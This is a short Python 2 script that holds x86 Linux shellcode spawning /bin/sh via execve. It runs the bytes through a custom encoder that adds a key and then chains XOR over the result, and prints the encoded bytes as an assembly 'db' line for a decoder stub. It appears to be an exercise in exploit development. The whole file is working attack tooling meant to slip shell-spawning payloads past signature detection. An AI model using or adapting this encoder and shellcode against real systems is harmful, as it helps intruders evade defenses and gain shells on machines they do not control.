#!/usr/bin/python

shellcode = ''
shellcode += '\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68'
shellcode += '\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b'
shellcode += '\xcd\x80'

key = 42
opcode = []  
opcode.append(0x66)
hexchain = ''
asm = 'shellcode: db '
index = 0

print "Encode!"
for x in bytearray(shellcode):
 	byte  = (x + key) % 256

 	byte = byte ^ opcode[index]
 	opcode.append(byte)

	asm += '0x'
	asm += '%02x, ' % byte

	index += 1

print 'Lenght shellcode: %d' % len(shellcode)
print hexchain
print asm